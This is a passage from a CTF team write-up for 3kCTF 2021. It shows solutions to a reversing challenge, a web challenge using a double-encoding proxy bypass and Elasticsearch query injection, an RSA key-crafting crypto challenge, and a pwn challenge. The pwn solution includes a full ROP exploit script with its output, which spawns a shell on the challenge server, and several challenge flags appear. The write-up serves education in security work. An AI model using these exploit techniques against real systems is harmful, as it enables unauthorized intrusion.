\u0026#34;0xAC6E0E08\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0x68961212\u0026#34;[label=\u0026#34;++v35\u0026#34;] \u0026#34;0x68961212\u0026#34; -\u0026gt; \u0026#34;0x7AFA98D4\u0026#34; \u0026#34;0x718C2A8A\u0026#34;[fillcolor=\u0026#34;lightblue\u0026#34;, style=\u0026#34;filled\u0026#34;] \u0026#34;0x718C2A8A\u0026#34; -\u0026gt; \u0026#34;0x67B26225\u0026#34; \u0026#34;0x775D4F05\u0026#34;[label=\u0026#34;END\u0026#34;] \u0026#34;0x7AFA98D4\u0026#34;[shape=\u0026#34;point\u0026#34;] \u0026#34;0x7AFA98D4\u0026#34; -\u0026gt; \u0026#34;0xAB353F6F\u0026#34;[label=\u0026#34;v35 \u0026lt; v36\u0026#34;] \u0026#34;0x7AFA98D4\u0026#34; -\u0026gt; \u0026#34;0xC20FEFFC\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0x7E2E7A9E\u0026#34;[label=\u0026#34;++v30\u0026#34;] \u0026#34;0x7E2E7A9E\u0026#34; -\u0026gt; \u0026#34;0x266844EC\u0026#34; \u0026#34;0x7EE39471\u0026#34;[label=\u0026#34;s[v33] = v42[4 * v33]\u0026#34;] \u0026#34;0x7EE39471\u0026#34; -\u0026gt; \u0026#34;0x9AEEB6EF\u0026#34; } sub_4008F0 digraph { node [shape=\u0026#34;box\u0026#34;]; \u0026#34;BEGIN\u0026#34;[fillcolor=\u0026#34;lightblue\u0026#34;, style=\u0026#34;filled\u0026#34;] \u0026#34;BEGIN\u0026#34; -\u0026gt; \u0026#34;0xB8C6BEDB\u0026#34; \u0026#34;0xB8C6BEDB\u0026#34;[label=\u0026#34;i2 = i\\ni = i - 1\u0026#34;] \u0026#34;0xB8C6BEDB\u0026#34; -\u0026gt; \u0026#34;0xDB5D7A76\u0026#34;[label=\u0026#34;i2\u0026#34;] \u0026#34;0xB8C6BEDB\u0026#34; -\u0026gt; \u0026#34;0xB43E0C74\u0026#34;[style=\u0026#34;dashed\u0026#34;] \u0026#34;0xDB5D7A76\u0026#34;[fillcolor=\u0026#34;lightblue\u0026#34;, style=\u0026#34;filled\u0026#34;] \u0026#34;0xDB5D7A76\u0026#34; -\u0026gt; \u0026#34;0xB8C6BEDB\u0026#34; \u0026#34;0xB43E0C74\u0026#34;[label=\u0026#34;END\u0026#34;] } cdemirer wrote a deobfuscator which made the script very readable. If you are interested on the deobfuscator, let\u0026rsquo;s wait if he is gonna write something about it.  Part II. Looking for the Algorithms By searching the constant available in sub_4008F0 (i.e., 0x61C88647), we found signs of Tiny Encryption Algorithm (TEA)3. By comparing to its implementation from Wikipedia4, we are convinced that sub_4008F0 is an encryptor of TEA.\nOn the other hand, sub_403EC0 is less trivial. It called sub_403090 once before the encryption is done - which I think is a key expansion algorithm. Eventually, I observed that dword_6060D0 is used in both of the functions above. I copied the first 16 bytes of it and searched on Google:\n\nThe subsequent bytes for dword_6060D0 match the S-boxes for Serpent. After all, the functions are implementing Serpent cipher. It is a lesser-known encryption algorithm - which is actually a candidate of AES. Up to now, I suspect that 0x606090 is the target ciphertext which is the encrypted flag. The key is derived by the sum of ascii values of the flag, which could be exhausted.\ndigraph { rankdir=LR node [shape=\u0026#34;box\u0026#34;] flag-\u0026gt;x1[label=\u0026#34;Serpent\u0026#34;] x1-\u0026gt;\u0026#34;bytes_606090\u0026#34;[label=\u0026#34;TEA\u0026#34;] x1[shape=\u0026#34;point\u0026#34;] } Unfortunately, we are unable to recover the flag. Unknowningly what happened, I decided to sleep.\nWhile I am asleep, harrier has notified us that the binary for the challenge is updated. There are one solve immediately after. This got me thinking: What I had is correct, but the ciphertext given from the previous binary is wrong. Hence, I updated my script with the new ciphertext and execute again - and I am able to get the flag:\nflag{_a1f040be800d4dd9a2b9a7d2b8f2be31_} p(a)wnshop (Web; 478 points) Solved by ozetta.\nThe first goal of this challenge is to access the admin backend service with this nginx configuration:\nlocation ~admin { auth_basic \u0026#34;pawnshop admin\u0026#34;; auth_basic_user_file /etc/nginx/.htpasswd; } location ~^/backend/(.*)$ { proxy_pass http://172.30.0.6:8080/$1; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $http_connection; } The challenge states that we should not brute force .htpasswd. So accessing /backend/admin.py with a valid password seems impossible. But luckily we can bypass the restriction with double-encoding: /backend/%2561dmin.py\nThen we need to inject the Elasticsearch query:\n\u0026#39;query_string\u0026#39;: { \u0026#39;query\u0026#39;: \u0026#39;id:\u0026gt;0 AND seller:\u0026#34;\u0026#39;+emailAddr+\u0026#39;\u0026#34;\u0026#39;, \u0026#34;default_field\u0026#34;:\u0026#34;seller\u0026#34; } where the email address is validated:\nfrom email.utils import parseaddr def verify_email(mail): parsedEmail = parseaddr(mail)[1] if parsedEmail == \u0026#39;\u0026#39; or parsedEmail != mail or not re.findall(r\u0026#39;.+@.+\\..+\u0026#39;,parsedEmail): api({\u0026#39;msg\u0026#39;:\u0026#39;invalid email\u0026#39;}) So the standard way to fulfill the validation while injecting the query is to use a pair of quote in the email name. To make a query we can reuse the UI provided:\nfunction x(q){ $.ajax({ url: \u0026#39;/backend/%2561dmin.py\u0026#39;, type : \u0026#34;POST\u0026#34;, data : {\u0026#34;action\u0026#34;:\u0026#34;lookup\u0026#34;,\u0026#34;mail\u0026#34;:\u0026#39;\u0026#34; AND value:*\u0026#39;+q+\u0026#39;* AND seller:\u0026#34;jmfffc@pawnshop.2021.3k.ctf.to\u0026#39;}, success : function(result) { console.log(result.msg); } }) } Note that jmfffc@pawnshop.2021.3k.ctf.to is the email address of the flag seller. Originally I use both upper case and lower case characters (and also some special characters like the underscore) in the query but I found that the query is case insensitive, so I remove the upper case characters later on. Then I got the possible bigrams of the flag:\nbigram = [\u0026#39;0u\u0026#39;,\u0026#39;1d\u0026#39;,\u0026#39;2_\u0026#39;,\u0026#39;3k\u0026#39;,\u0026#39;41\u0026#39;,\u0026#39;il\u0026#39;,\u0026#39;ti\u0026#39;,\u0026#39;uh\u0026#39;,\u0026#39;ma\u0026#39;,\u0026#39;hu\u0026#39;,\u0026#39;em\u0026#39;,\u0026#39;p2\u0026#39;,\u0026#39;tt\u0026#39;,\u0026#39;io\u0026#39;,\u0026#39;da\u0026#39;,\u0026#39;_v\u0026#39;,\u0026#39;4n\u0026#39;,\u0026#39;nd\u0026#39;,\u0026#39;al\u0026#39;,\u0026#39;on\u0026#39;,\u0026#39;va\u0026#39;,\u0026#39;u_\u0026#39;,\u0026#39;ai\u0026#39;,\u0026#39;at\u0026#39;,\u0026#39;l_\u0026#39;,\u0026#39;s4\u0026#39;,\u0026#39;_s\u0026#39;,\u0026#39;_4\u0026#39;,\u0026#39;_e\u0026#39;,\u0026#39;n_\u0026#39;,\u0026#39;tp\u0026#39;,\u0026#39;_h\u0026#39;,\u0026#39;ht\u0026#39;,\u0026#39;_y\u0026#39;,\u0026#39;y0\u0026#39;,\u0026#39;l1\u0026#39;,\u0026#39;d_\u0026#39;]; We have 3k in the bigram list as expected. Our teammate Mystiz created a bigram graph for himself (not me, I don't know how to read the graph effectively):\ndigraph{ \u0026#34;0\u0026#34; -\u0026gt; \u0026#34;u\u0026#34; \u0026#34;1\u0026#34; -\u0026gt; \u0026#34;d\u0026#34; \u0026#34;2\u0026#34; -\u0026gt; \u0026#34;_\u0026#34; \u0026#34;3\u0026#34; -\u0026gt; \u0026#34;k\u0026#34; \u0026#34;4\u0026#34; -\u0026gt; \u0026#34;1\u0026#34; \u0026#34;i\u0026#34; -\u0026gt; \u0026#34;l\u0026#34; \u0026#34;t\u0026#34; -\u0026gt; \u0026#34;i\u0026#34; \u0026#34;u\u0026#34; -\u0026gt; \u0026#34;h\u0026#34; \u0026#34;m\u0026#34; -\u0026gt; \u0026#34;a\u0026#34; \u0026#34;h\u0026#34; -\u0026gt; \u0026#34;u\u0026#34; \u0026#34;e\u0026#34; -\u0026gt; \u0026#34;m\u0026#34; \u0026#34;p\u0026#34; -\u0026gt; \u0026#34;2\u0026#34; \u0026#34;t\u0026#34; -\u0026gt; \u0026#34;t\u0026#34; \u0026#34;i\u0026#34; -\u0026gt; \u0026#34;o\u0026#34; \u0026#34;d\u0026#34; -\u0026gt; \u0026#34;a\u0026#34; \u0026#34;_\u0026#34; -\u0026gt; \u0026#34;v\u0026#34; \u0026#34;4\u0026#34; -\u0026gt; \u0026#34;n\u0026#34; \u0026#34;n\u0026#34; -\u0026gt; \u0026#34;d\u0026#34; \u0026#34;a\u0026#34; -\u0026gt; \u0026#34;l\u0026#34; \u0026#34;o\u0026#34; -\u0026gt; \u0026#34;n\u0026#34; \u0026#34;v\u0026#34; -\u0026gt; \u0026#34;a\u0026#34; \u0026#34;u\u0026#34; -\u0026gt; \u0026#34;_\u0026#34; \u0026#34;a\u0026#34; -\u0026gt; \u0026#34;i\u0026#34; \u0026#34;a\u0026#34; -\u0026gt; \u0026#34;t\u0026#34; \u0026#34;l\u0026#34; -\u0026gt; \u0026#34;_\u0026#34; \u0026#34;s\u0026#34; -\u0026gt; \u0026#34;4\u0026#34; \u0026#34;_\u0026#34; -\u0026gt; \u0026#34;s\u0026#34; \u0026#34;_\u0026#34; -\u0026gt; \u0026#34;4\u0026#34; \u0026#34;_\u0026#34; -\u0026gt; \u0026#34;e\u0026#34; \u0026#34;n\u0026#34; -\u0026gt; \u0026#34;_\u0026#34; \u0026#34;t\u0026#34; -\u0026gt; \u0026#34;p\u0026#34; \u0026#34;_\u0026#34; -\u0026gt; \u0026#34;h\u0026#34; \u0026#34;h\u0026#34; -\u0026gt; \u0026#34;t\u0026#34; \u0026#34;_\u0026#34; -\u0026gt; \u0026#34;y\u0026#34; \u0026#34;y\u0026#34; -\u0026gt; \u0026#34;0\u0026#34; \u0026#34;l\u0026#34; -\u0026gt; \u0026#34;1\u0026#34; \u0026#34;d\u0026#34; -\u0026gt; \u0026#34;_\u0026#34; } Then he started fine-tuning the flag... _email,y0u,val1d,http2,val1dation,s41d\n\nI forgot to tell him I found the keyword huh before, huh. But he found that immediately afterwards. I build a trigram later on, but Mystiz did not need this:\ntrigram = [\u0026#39;1da\u0026#39;,\u0026#39;1d_\u0026#39;,\u0026#39;2_4\u0026#39;,\u0026#39;0u_\u0026#39;,\u0026#39;41d\u0026#39;,\u0026#39;tp2\u0026#39;,\u0026#39;dat\u0026#39;,\u0026#39;htt\u0026#39;,\u0026#39;d_h\u0026#39;,\u0026#39;_4n\u0026#39;,\u0026#39;on_\u0026#39;,\u0026#39;val\u0026#39;,\u0026#39;nd_\u0026#39;,\u0026#39;y0u\u0026#39;,\u0026#39;al1\u0026#39;,\u0026#39;mai\u0026#39;,\u0026#39;u_s\u0026#39;,\u0026#39;ttp\u0026#39;,\u0026#39;ail\u0026#39;,\u0026#39;_y0\u0026#39;,\u0026#39;huh\u0026#39;,\u0026#39;s41\u0026#39;,\u0026#39;tio\u0026#39;,\u0026#39;ati\u0026#39;,\u0026#39;ion\u0026#39;,\u0026#39;_hu\u0026#39;,\u0026#39;_va\u0026#39;,\u0026#39;n_y\u0026#39;,\u0026#39;l_v\u0026#39;,\u0026#39;il_\u0026#39;,\u0026#39;ema\u0026#39;,\u0026#39;l1d\u0026#39;,\u0026#39;_s4\u0026#39;,\u0026#39;d_e\u0026#39;,\u0026#39;_em\u0026#39;,\u0026#39;4nd\u0026#39;,\u0026#39;p2_\u0026#39;]; \nThen he submitted the flag before I got the flag: 3k{http2_4nd_email_val1dation_y0u_s41d_huh}.\nBy the way, the intended solution was to use h2c request smuggling instead of double encoding to bypass the proxy checking.\nASR (Crypto; 483 points) Solved by TWY.\nPart I. Basic Knowledge Fermat Little Theorem: $a^p\\equiv a \\pmod p$ for all prime number $p$'s, or equivalently,\n\\[ a^{p-1} \\equiv \\left\\{ \\begin{array}{ll} 0 \u0026 a \\bmod p \\equiv 0\\\\ 1 \u0026 \\text{otherwise} \\end{array} \\right. \\pmod p\\]\nfor all prime number $p$'s.\nPart II. Analysis The program uses OpenSSL.crypto as the RSA private key loading library.\nGiven $m$ and $c$, the final target of the challenge is to generate a private key such that $m^d \\bmod N = c$.\nwith the constraints\n $d \u0026gt; 1337^5$ (i dont like small numbers) $N \\bmod 2 \\neq 0$ (and i dont like even numbers).  The beginning of the source code checks whether the following key is valid:\n-----BEGIN RSA PRIVATE KEY----- MBsCAQACAS0CAQcCAQACAQ8CAQMCAQACAQACAQA= -----END RSA PRIVATE KEY----- The key reads as the following:\nversion = 0x00 (0) modulus = 0x2d (45) public exponent = 0x07 (7) private exponent = 0x00 (0) prime1 = 0x0f (15) prime2 = 0x03 (3) exponent1 = 0x00 (0) exponent2 = 0x00 (0) coefficient = 0x00 (0) Apparently 15 is neither a prime nor coprime with 3, and all parameters involving modular inverse calculations are set to 0. So this should be an invalid key.\nHowever, earlier versions do not recognize this invalid key pattern, so it may pass the check.\nHence this check in the source code is used tell us that the challenge server is not using the older version that allows such kind of invalid keys.\nimport OpenSSL.crypto as crypto rsa_p_not_prime_pem = \u0026#34;\u0026#34;\u0026#34;\\n-----BEGIN RSA PRIVATE KEY-----\\nMBsCAQACAS0CAQcCAQACAQ8CAQMCAQACAQACAQA=\\n-----END RSA PRIVATE KEY-----\\n\u0026#34;\u0026#34;\u0026#34; invalid_key = crypto.load_privatekey(crypto.FILETYPE_PEM, rsa_p_not_prime_pem) error_msg = \u0026#34;Pycrypto needs to be patched!\u0026#34; try: invalid_key.check() raise RuntimeError(error_msg) except crypto.Error: pass Obviously this is not pycrypto but OpenSSL.crypto library.\nThe expected error message (if printed out) is (realigned):\nOpenSSL.crypto.Error: [ ( \u0026#39;rsa routines\u0026#39;, \u0026#39;RSA_check_key_ex\u0026#39;, \u0026#39;p not prime\u0026#39; ),( \u0026#39;rsa routines\u0026#39;, \u0026#39;RSA_check_key_ex\u0026#39;, \u0026#39;d e not congruent to 1\u0026#39; ),( \u0026#39;bignum routines\u0026#39;, \u0026#39;BN_mod_inverse\u0026#39;, \u0026#39;no inverse\u0026#39; ) ] Since the error list is actually quite comprehensive, which means we had better use a valid RSA key with two primes.\nPart III. Making Use of the Theorem(s) Since we know that $a^{p-1} \\equiv 1 \\pmod p$ for all $a$'s such that $0 \\lt a \\lt p$, we can conclude that $a^x - a^{x \\bmod{(p-1)}} \\equiv 0 \\pmod p$ for all possible $a$'s for all non-negative integer $x$'s.\nTo fulfill the modular equation in the challenge, the modulus $N$ needs to be larger than $c$, which means we need to have primes $p$ and $q$ such that $pq \u0026gt; c$.\nInstead of finding $N$ directly, we can make use of the Chinese remainder theorem to construct the values of $N$, $d$, and $e$ if we can obtain two equations like this:\n\\[ \\left\\{ \\begin{array}{ll} m^{x_p} \\equiv c \\pmod p \\\\ m^{x_q} \\equiv c \\pmod q \\end{array} \\right. \\]\nThen we have\n\\[ \\left\\{ \\begin{array}{ll} d \\bmod{(p-1)} \\equiv x_p \\\\ d \\bmod{(q-1)} \\equiv x_q \\end{array} \\right. \\]\nNotice that for odd prime $p$ and $q$, both $p-1$ and $q-1$ are even, which means $\\phi(N)$ (Euler's totient function) must be even. Therefore, in most cases $d$ has to be odd so that $e$ can be obtained, i.e. $d$ is invertible under modulo $\\phi(N)$. (Since the value of $\\lambda(N)$ (Carmichael function / Reduced totient function) is always even except that $\\lambda(1) = \\lambda(2) = 1$, no such exception exists)\nThis means for example there is no use finding an even $x_p = p - 1$ where $p$ is $260163...128287$ (a 183-digit prime factor of $c-1$5), so $m^{p-1}\\equiv 1 \\equiv c \\pmod p$.\nTo generalize, we only need $x_p = p - 1 + b$, where $p$ is a prime factor of $c - m^b$ for odd $b$. Here $m^{x_p} \\equiv m^{p-1+b}\\equiv m^b \\equiv c \\pmod p$.\nWith the help of Alpertron6, we obtained the largest factor of $c-m^7$, which is $r_1 := 795088...535639$ (185 digits)7 and the largest factor of $c-m^{11}$, which is $r_2 := 140515...084809$ (190 digits)8.\nHowever, these two factors do not work, why?\nThe reason is that $\\text{GCD}(p-1, q-1)=42$, and $7 \\not\\equiv 11 \\pmod{42}$.\nTherefore, we continued and went into a long way of dealing with the factorization of much larger numbers (Since $m^{12}\\gt c$, $m^b$ becomes exponentially greater than $c$ for $b \\geq 12$), and found the largest prime factor of $-(c-m^{27})$, which is $r_3 := 156985...742221$ (468 digits!!!)9\nNote: Since RSA Private Key requires two primes, so we cannot just use this alone although this already far exceeds $c$  Now let's try to find the GCD again.\n $\\text{GCD}(r_1-1, r_2-1)=42$ $\\text{GCD}(r_1-1, r_3-1)=2$ $\\text{GCD}(r_2-1, r_3-1)=4$  Since $7\\equiv11\\equiv27\\pmod 4$, so using either of them along with the new prime factor is fine. (Really?)\nIn this case, we have chosen $r_2$.\nActually the pair using $r_1$ does not work (to be explained later).  Since these two numbers are not coprime, we actually have to set up three equations for the CRT.\n\\[ \\left\\{ \\begin{array}{ll} d \\bmod{\\frac{r_2-1}{8}} \\equiv 11 \\\\ d \\bmod{\\frac{r_3-1}{4}} \\equiv 27 \\\\ d \\bmod{8} \\equiv 3 \\end{array} \\right. \\]\nBy the Chinese Remainder Theorem, we have $d = 469849...444147$.\nPart IV: Generating the Private Key So we can generate the private key, by submitting the proof of work and the key to the challenge server to obtain the flag:\nn = p * q e = pow(d, -1, (p - 1) * (q - 1)) from Crypto.PublicKey import RSA key = RSA.construct((n, e, d)) print(key.export_key().decode()) Sample Private Key:\n-----BEGIN RSA PRIVATE KEY----- MIIFJAIBAAKCAREUDyj+A0LeFPNuAY78kHjkqce86Hut6sL7GR4UG67f9yPyVi62 AHgbEXBRqPUVL2irfgqa/RoGqsSPnT8THeqgHpFbxErqDihyRjPgXEQYiMGG00rY ZxGvESxd1V5WnwRi5qIYtodcYpH4W3mzRS13OkPwE9MghZpbDLv/MQuoga9hsWDx 6HnMqjn1QKJQCFMFJkf3jhl+B0U+qAiKFbNoFxw94n7S5iXHvktsNYfXfBlBWfYH h3xvjbxCCEqcJCCJY58nihI88dVJizXWPAk6EdVFmz2A9Aepk/sQDx39IPv/gYCI xH6HHnwNZGhasTk0SPMpelgpDj/EIVr67cHTt16MMGNse2nLNhJ4xCJ2nXUCggER C2ZYKkUhLkMbl2cpuicTznJnfg1tJfW6OUg3SVQ/hF5iyxtIEC1dB0lQFEInzU94 OZ5UbFuXsFKH2LoUgW28c+lEi7ZEVgADYSK/vRXJ1gg2SJXpXq+fAgK2rup2jYUH fs4uTTHEdHZsn68HmI2vSfbE+YnAPQgKV2wfKxHjTyac9CnKUBS4vgg7r7NFXwrF UKxA/KW2JqItgGHQOO3f+CUzvncdjEt+DZtLzICYnjYCgpcdCppfPJnbjLgEoUMX Ce/dFZBduXTyJTZYjivkAQPcqnrtb9001p4znE2qW2oYwkJnbMI3nYfUY8ZPgFR9 0skLeaZGnhJ9nioPMuJm58vnXhjTbxoHb3SZ6/+pYjJbAoIBEQRFxqXzpe/5sPhX +8QJ1HFaynfmBMXlq07MtzOIwUimHVg+O2GuXGp1PmfJncsZnl2FDprTMtb8KF7s 2XZwQTqNb34gLL1Ux78HzL6hyjrMXUOuusNa/fyssajrBYG5vO7VpxFWstZOPNk+ ThMh3XYLTUPhuVyQ/ng5mh0tM1bV1fhAzuzOSU83Mm0rNHkJxU0BNry1wYaGEgTa FpxETEG1rvt+KG+KPwvb/tMsznZqfFMUxnpRfCIHWZHSXjVqo73kmHnNCBn8reFs 7kWHA+k0ZAkfwCJpzNPsHthFFM795d0aFR8QjH0FJmSerAX1joJlVApGWSkQfhlJ aLZCC/+cqWXftq9VkFcmMjwNu95d8wKBwwD+aqp1+dd5Fwl4cpmIN55IlSY868Lv +YzuZCKcJjVzXZgkjOpegziBN+gWVVn0j5MMFn+hHYCN0j0ZKKAFVASxLBwIN+Wb yppI5gaqj99utjptpoUnI0W4hHk6d3OpnT/8vcPhsSesupTB9DYtsH7oq1b9ynVm z7GTI+GRwhfa5/YCqi57jlVKbo7M4Tvw2JN05HRNzVbjZefjy1PLK9esnYY0qcQY bxywSF5kyOj9Pd8Ao/tCLbNZH3i7E8Et/iIajQJPFC8eR3E5VZniAqLKfNtngNS/ IfhKGDHGZxZ+psfLx9USKT2Lrnp/dM6VKPZIzNz1BcYRWj2GFVi35tW7npDcVnZS rWBlpm/MJnNgH2oIiQIBGwIBCwKBwkzSg9YK9nvOxmDugCz+LNi82wRBhKiDpXGx ZN2pamHx+lndJRWC9fslPEOCgkhngdN3kSUMRJrhP84df3I44XthJIYn33mXteFZ noWHut0IHxERByKpmAH7cU4+YogwyV0PlhVvjJBq/zYHYhSJqRE5upl+TZxSg8aD n7Mf5EHaUUjTxBO9xvkJntaDJAjKcZC7+s45wiJphO0I7uJ7s9cI9hqz4GBnZ7AH bJ+WsYQzn+HtKK9H2mNaWklsHJ7OeYBl -----END RSA PRIVATE KEY----- For the completeness, here we explain why the pair using $r_1 - 1$ does not work:\nBoth the calculated $d$ ($213175\u0026hellip;494107$) and $p-1$ ($r_1 - 1$) are divisible by $7$, so $d$ has no inverse under modulo $(p-1)(q-1)$, thus there are no $e$s. This explains the actual difficulty in finding a pair that passes all the coprime checks.\n masterc (Pwn; 478 points) Solved by bot_3310.\nTL;DR.\n leak PIE base overwrite stack guard leak libc base syscall   First, we take a look at the binary.\n──(bot3310㉿kali)-[~/Downloads/3kCTF/masterc/bin] └─$ checksec masterc [*] \u0026#39;/home/bot3310/Downloads/3kCTF/masterc/bin/masterc\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled This binary has enabled all the protections. We are also given a C source code of the binary file. After analyzing the source code, we found win is vulnerable to ROP.\nvoid win() { char buf[0x10]; puts(\u0026#34;\u0026gt; \u0026#34;); gets(buf); } Then, we found that we can leak PIE base in play_game.\nunsigned long play_game() { static int counter; unsigned long r, guess; r = rand(); printf(\u0026#34;Enter your guess : \u0026#34;); get_ul(\u0026amp;guess); if(r == guess) { printf(\u0026#34;win!\\n\u0026#34;); win(); } if(counter == max_tries-1) { printf(\u0026#34;Sorry, that was the last guess!\\n\u0026#34;); printf(\u0026#34;You entered %lu but the right number was %lu\\n\u0026#34;, guess, r); return r; } counter++; return r; } The guess variable has not initialized at the beginning, it will be initialized by our input in get_u1. However get_u1 uses scanf(\u0026quot;%lu\u0026quot;, num) to get our input.\nvoid get_ul(unsigned long* num) { fflush(stdout); scanf(\u0026#34;%lu\u0026#34;, num); readuntil(\u0026#39;\\n\u0026#39;); } %lu represents a unsigned long number, if we input a character, the guess will not be initialized successfully. If we input 1 as the guess number, the stack will be:\n0x00007fffffffdd80│+0x0000: 0x00007fffffffdda0 → 0x00007fffffffdde0 → 0x0000555555555730 → \u0026lt;__libc_csu_init+0\u0026gt; endbr64 ← $rsp 0x00007fffffffdd88│+0x0008: 0x0000000000000001 0x00007fffffffdd90│+0x0010: 0x000000004b4bb6e3 0x00007fffffffdd98│+0x0018: 0x5c724145e4937e00 0x00007fffffffdda0│+0x0020: 0x00007fffffffdde0 → 0x0000555555555730 → \u0026lt;__libc_csu_init+0\u0026gt; endbr64 ← $rbp We can see our guess number is store in rsp+0x8. If we input A as the guess number, the stack will be:\n0x00007fffffffdd80│+0x0000: 0x00007fffffffdda0 → 0x00007fffffffdde0 → 0x0000555555555730 → \u0026lt;__libc_csu_init+0\u0026gt; endbr64 ← $rsp 0x00007fffffffdd88│+0x0008: 0x0000555555555579 → \u0026lt;set_number_of_tries+39\u0026gt; mov DWORD PTR [rbp-0x4], eax 0x00007fffffffdd90│+0x0010: 0x0000000051831fd3 0x00007fffffffdd98│+0x0018: 0x44282bb265056400 0x00007fffffffdda0│+0x0020: 0x00007fffffffdde0 → 0x0000555555555730 → \u0026lt;__libc_csu_init+0\u0026gt; endbr64 ← $rbp In rsp+0x8, there is the address of \u0026lt;set_number_of_tries+39\u0026gt; instead of the guess number because the guess variable has not initialized.\nAlso, in play_game, if there is the last try to guess, it will print out our guess number. Therefore, we can leak the address of \u0026lt;set_number_of_tries+39\u0026gt; when we input a character as our guess.\nWe can get the base address for PIE after subtracting the offset of \u0026lt;set_number_of_tries+39\u0026gt;.\np.sendlineafter(\u0026#39;size :\u0026#39;, \u0026#39;1\u0026#39;) p.sendlineafter(\u0026#39;tries :\u0026#39;, \u0026#39;1\u0026#39;) p.sendlineafter(\u0026#39;guess\u0026#39;, \u0026#39;A\u0026#39;) # leak pie_base p.recvuntil(\u0026#39;entered\u0026#39;) leak = str(p.recvuntil(\u0026#39;but\u0026#39;)) leak = int(leak[3:-4]) pie_base = leak - 0x1579 print(\u0026#34;pie_base:\u0026#34;, hex(pie_base)) Although we failed to guess that random number, we can still get into win but with pthread:\nprintf(\u0026#34;I don\u0026#39;t think you won the game if you made it until here ...\\n\u0026#34;); printf(\u0026#34;But maybe a threaded win can help?\\n\u0026#34;); pthread_t tid; pthread_create(\u0026amp;tid, NULL, (void*)win, NULL); pthread_join(tid, NULL); pthread_t will copy the tcbhead_t in stack for the new thread.\ntypedef struct { void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; int gscope_flag; uintptr_t sysinfo; uintptr_t stack_guard; uintptr_t pointer_guard; // ... } tcbhead_t; At the end of function, canary will be compared to the stack_guard to avoid stack smashing. Since pthread is placed the tcbhed_t in stack, we can overwrite the stack_guard to ensure the sucess of canary checking. If we overwite the stack_guard to AAAAAAAA, we can also use AAAAAAAA to overwrite the canary value.\nNow, we can overflow unlimited buffer in win. We also have the PIE base address and avoid the canary check to fail. We can leak the libc base address with simple rop and return to win again.\n# leak libc_base win = pie_base + 0x1436 pop_rdi = pie_base + 0x0000000000001793 puts_got = pie_base + elf.got[\u0026#39;puts\u0026#39;] puts_plt = pie_base + elf.plt[\u0026#39;puts\u0026#39;] payload = b\u0026#39;A\u0026#39;*40 payload += p64(pop_rdi) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(win) payload += b\u0026#39;A\u0026#39; * 3000 # buffer big enough to overwrite the stack guard p.sendlineafter(\u0026#39;\u0026gt;\u0026#39; , payload) p.recv() leak_put = p.recv(6) libc_base = u64(leak_put.ljust(8, b\u0026#39;\\x00\u0026#39;)) - libc.symbols[\u0026#39;puts\u0026#39;] print(\u0026#39;libc_base:\u0026#39;, hex(libc_base)) Finally, we use syscall to get the shell:\nbinsh = libc_base + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) # ret2libc syscall pop_rax = libc_base + 0x000000000004a550 pop_rdx = libc_base + 0x0000000000162866 pop_rsi = libc_base + 0x0000000000027529 syscall = libc_base + 0x000000000002584d payload = b\u0026#39;A\u0026#39;*40 payload += p64(pop_rax) payload += p64(0x3b) payload += p64(pop_rdi) payload += p64(binsh) payload += p64(pop_rdx) + p64(0) + p64(0) payload += p64(pop_rsi) + p64(0) payload += p64(syscall) p.sendlineafter(\u0026#39;\u0026gt;\u0026#39;,payload) p.interactive()┌──(bot3310㉿kali)-[~/Downloads/3kCTF/masterc/bin] └─$ python3 exp.py remote [*] \u0026#39;/home/bot3310/Downloads/3kCTF/masterc/bin/masterc\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to masterc.2021.3k.ctf.to on port 9999: Done [*] \u0026#39;/home/bot3310/Downloads/3kCTF/masterc/bin/libc-2.31.so\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled pie_base: 0x559acce67000 libc_base: 0x7f51832bf000 [*] Switching to interactive mode $ ls bin dev flag.txt ld-2.31.so lib lib32 lib64 libc-2.31.so libx32 masterc usr $ cat flag.txt 3k{WH47_Pr3V3N7_Y0U_Fr0M_r0PP1N6_1F_Y0U_C4N_0V3rWr173_7H3_M4573r_C4N4rY_17531F} This is the final exploit:\nfrom pwn import * TARGET = \u0026#39;./masterc\u0026#39; HOST = \u0026#39;masterc.2021.3k.ctf.to\u0026#39; PORT = 9999 context.arch = \u0026#39;amd64\u0026#39; # i386 / amd64 #context.log_level = \u0026#39;debug\u0026#39; elf = ELF(TARGET) if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;remote\u0026#39;: p = remote(HOST, PORT) libc = ELF(\u0026#39;./libc-2.31.so\u0026#39;) else: p = process(TARGET) libc = elf.libc #--- #gdb.attach(p, gdbscript=\u0026#39;b *win+56\u0026#39;) p.sendlineafter(\u0026#39;size :\u0026#39;, \u0026#39;1\u0026#39;) p.sendlineafter(\u0026#39;tries :\u0026#39;, \u0026#39;1\u0026#39;) p.sendlineafter(\u0026#39;guess\u0026#39;, \u0026#39;A\u0026#39;) # leak pie_base p.recvuntil(\u0026#39;entered\u0026#39;) leak = str(p.recvuntil(\u0026#39;but\u0026#39;)) leak = int(leak[3:-4]) pie_base = leak - 0x1579 print(\u0026#34;pie_base:\u0026#34;, hex(pie_base)) # leak libc_base win = pie_base + 0x1436 pop_rdi = pie_base + 0x0000000000001793 puts_got = pie_base + elf.got[\u0026#39;puts\u0026#39;] puts_plt = pie_base + elf.plt[\u0026#39;puts\u0026#39;] payload = b\u0026#39;A\u0026#39;*40 payload += p64(pop_rdi) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(win) payload += b\u0026#39;A\u0026#39; * 3000 # buffer big enough to overwrite the stack guard p.sendlineafter(\u0026#39;\u0026gt;\u0026#39; , payload) p.recv() leak_put = p.recv(6) libc_base = u64(leak_put.ljust(8, b\u0026#39;\\x00\u0026#39;)) - libc.symbols[\u0026#39;puts\u0026#39;] print(\u0026#39;libc_base:\u0026#39;, 